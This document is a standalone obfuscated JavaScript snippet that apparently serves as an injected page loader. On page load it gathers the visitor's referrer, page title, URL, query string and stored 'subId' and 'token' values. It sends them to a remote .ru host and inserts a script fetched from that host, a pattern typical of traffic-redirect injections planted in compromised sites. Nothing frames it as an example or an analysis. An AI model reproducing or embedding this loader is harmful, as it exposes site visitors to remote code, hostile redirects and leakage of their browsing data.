 (function() {
    var name = '_C19nnDHrV9chmzMj';
    if (!window._C19nnDHrV9chmzMj) {
        window._C19nnDHrV9chmzMj = {
            unique: false,
            ttl: 86400,
            R_PATH: 'https://derinews.ru/xTWSxyCy',
        };
    }
    const _h8DbTRLSy1Zvs2CY = localStorage.getItem('config');
    if (typeof _h8DbTRLSy1Zvs2CY !== 'undefined' && _h8DbTRLSy1Zvs2CY !== null) {
        var _Z7rtTBjk3fcCdjxs = JSON.parse(_h8DbTRLSy1Zvs2CY);
        var _TY2nDqWgHNhL1Xxh = Math.round(+new Date()/1000);
        if (_Z7rtTBjk3fcCdjxs.created_at + window._C19nnDHrV9chmzMj.ttl < _TY2nDqWgHNhL1Xxh) {
            localStorage.removeItem('subId');
            localStorage.removeItem('token');
            localStorage.removeItem('config');
        }
    }
    var _P6wzMprDYzWG3Hxq = localStorage.getItem('subId');
    var _j22SNZ1TJXXjWY1N = localStorage.getItem('token');
    var _fKrHgZtCBFkVfMcs = '?return=js.client';
        _fKrHgZtCBFkVfMcs += '&' + decodeURIComponent(window.location.search.replace('?', ''));
        _fKrHgZtCBFkVfMcs += '&se_referrer=' + encodeURIComponent(document.referrer);
        _fKrHgZtCBFkVfMcs += '&default_keyword=' + encodeURIComponent(document.title);
        _fKrHgZtCBFkVfMcs += '&landing_url=' + encodeURIComponent(document.location.hostname + document.location.pathname);
        _fKrHgZtCBFkVfMcs += '&name=' + encodeURIComponent(name);
        _fKrHgZtCBFkVfMcs += '&host=' + encodeURIComponent(window._C19nnDHrV9chmzMj.R_PATH);
    if (typeof _P6wzMprDYzWG3Hxq !== 'undefined' && _P6wzMprDYzWG3Hxq && window._C19nnDHrV9chmzMj.unique) {
        _fKrHgZtCBFkVfMcs += '&sub_id=' + encodeURIComponent(_P6wzMprDYzWG3Hxq);
    }
    if (typeof _j22SNZ1TJXXjWY1N !== 'undefined' && _j22SNZ1TJXXjWY1N && window._C19nnDHrV9chmzMj.unique) {
        _fKrHgZtCBFkVfMcs += '&token=' + encodeURIComponent(_j22SNZ1TJXXjWY1N);
    }
    var a = document.createElement('script');
        a.type = 'application/javascript';
        a.src = window._C19nnDHrV9chmzMj.R_PATH + _fKrHgZtCBFkVfMcs;
    var s = document.getElementsByTagName('script')[0];
    s.parentNode.insertBefore(a, s)
    })();
